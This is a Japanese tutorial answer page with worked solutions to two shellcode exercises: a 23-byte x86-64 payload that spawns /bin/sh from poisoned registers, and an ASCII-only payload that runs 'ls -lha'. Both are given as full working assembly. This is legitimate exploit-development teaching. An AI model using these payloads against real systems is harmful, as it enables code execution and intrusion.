---
title: 例題の解答 - シェルコードの書き方
date: 2022-02-06 14:04:00
lang: ja
---

## 例題１
【問題】
すべての汎用レジスタが0xdeadbeefcafebabeの状態から`/bin/sh`を起動するシェルコードを24バイト以内で書け。（汎用レジスタはRSPやRBPも含む。） 

【解答】
シェルを起動するためには

- rdxを0にする
- rsiを0にする
- rdiに"/bin/sh"の文字列ポインタを入れる
- raxを59にする
- `syscall`命令を呼ぶ

という処理が必要です。まずraxを59にすることを考えます。
```
mov eax, 59
```
では5バイト消費してしまうので、alに対する操作にします。そのためeaxを0にしてからalに59を書き込みます。
```
xor eax, eax
mov al, 59
```
これで4バイトになりました。
xorにより最初にeaxが0になるので、これを利用して`cdq`命令でrdxレジスタを0にしましょう。rsiについてはxorかmovで0にして、`syscall`命令を呼びます。
```
xor eax, eax
cdq
mov esi, eax
mov al, 59
syscall
```
ここまで9バイトで条件を4つクリアしました。
残る条件はrdiに"/bin/sh"のアドレスを入れることです。`call`命令を使うと短く済むのですが、今回スタックポインタが不正なアドレスを指しているので`call`や`pop`は使えません。
すると`lea`命令を使うことを考えますが
```
lea rdi, [rel s_binsh]
```
は8バイトも使ってしまいます。"/bin/sh\\0"に8バイト必要なので、ここまでを合わせると8+8+9=25となり、24バイトでは実現できません。そこで、別の方法を使ってシェルコード領域のポインタを取得します。
今回raxレジスタの初期状態は0xdeadbeefcafebabeなので、この状態でシステムコールを呼ぶと必ず失敗します。この際rcxレジスタに戻りアドレスが入るので、ここからシェルコード領域のアドレスを取得できます。シェルコードのアドレスが分かれば、rcxに値を足して"/bin/sh"へのポインタを作れば完成です。
以下のシェルコードは23バイトです。
```
syscall
xor eax, eax
cdq
mov esi, eax
lea rdi, [rcx+13]
mov al, 59
syscall
db "/bin/sh",0
```
このシェルコードは[ここ](src/smalsh.S)からダウンロードできます。
同じ条件でもっと短いシェルコードを書けたよ〜という方はご一報ください。

## 例題２
【問題】
0x00から0x7Fまでのバイト列のみを使って「ls -lha」を実行するシェルコードを書け。ただし、シェルコード領域は書き込み不能とする。また、RSPは正常なスタックポインタを指しているが、それ以外のレジスタやスタック上のデータの初期状態はランダムと仮定する。 

【解答】
まずコマンドを実行するためには次の処理をする必要があります。

- rdxを0にする
- rsiを引数配列のポインタにする
- rdiを文字列ポインタにする
- raxを59にする
- `syscall`命令を呼ぶ

レジスタの初期状態がランダムなので、まずはレジスタを0にすることを考えます。これは説明した通り、次の命令で実現できます。
```
push rax
xor rax, [rsp]
```
したがって、rdxを0にするのは実現可能です。次にraxを59にする方法ですが、add命令が使えます。
```
add al, 59
```
これでシステムコール番号も用意できました。`syscall`命令はASCIIの範囲内なのでそのまま使えます。

さて、文字列ポインタを取得する方法ですが、`call`命令や`lea`命令を使うとASCIIの範囲を超えるため、例題１と同じく`syscall`命令を使ってシェルコードのアドレスを取得します。今回レジスタの初期状態は未定義ですので、システムコールが必ず失敗する（あるいは意味の無い動作をする）状況を作ってから`syscall`命令を呼び出しましょう。
```
; rax=0
push rax
xor rax, [rsp]
; rsi=0
push rax
pop rsi
; rcx=shellcode+delta
syscall
; <-- retaddr
```
シェルコードのアドレスが得られたので、シェルコード上に用意した各種文字列へのポインタが計算できます。次のようにしてraxにデータへのポインタが入ります。
```
push rcx
pop rax
add al, arg1 - retaddr
```
なお、今回alレジスタに固定値を加算しているため2つの問題が発生します。
1つはオフセット`arg1 - retaddr`がASCIIで表せないオフセットになる可能性です。今回作るシェルコードは十分に小さいのでこれは起こりません。もしオフセットが大きくなったとしても、ゴミデータでオフセットをずらして2バイトの値にし、axレジスタに加算すれば問題は回避できます。
次にalへの加算でオーバーフローが発生した場合に64-bitとして見たときの計算結果がずれる可能性です。こちらはシェルコードがロードされるアドレスによって十分に起こり得ます。その場合、初めに`syscall`命令を呼ぶ前に`push rax; pop rax;`のようなゴミ命令を入れてオフセットをずらせば解決できます。

さて、ここまでの説明でシェルコードは作れます。
```
; rax=0
push rax
xor rax, [rsp]
; rsi=0
push rax
pop rsi
; rcx=shellcode+delta
syscall
@retaddr:
; rdx=0; push 0
push rdx
xor rdx, [rsp]
push rdx
; push arg2
push rcx
pop rax
add al, @arg2 - @retaddr
push rax
; push arg1
push rcx
pop rax
add al, @arg1 - @retaddr
push rax
; push arg0
push rcx
pop rax
add al, @arg0 - @retaddr
push rax
; rdi=arg0
push rax
pop rdi
; rsi=rsp
push rsp
pop rsi
; rax=59
push rdx
pop rax
add al, 59
; syscall
syscall

@arg0:
db "/bin/sh", 0
@arg1:
db "-c", 0
@arg2:
db "/bin/ls -lha", 0
```
このシェルコードは[ここ](src/asciils.S)からダウンロードできます。
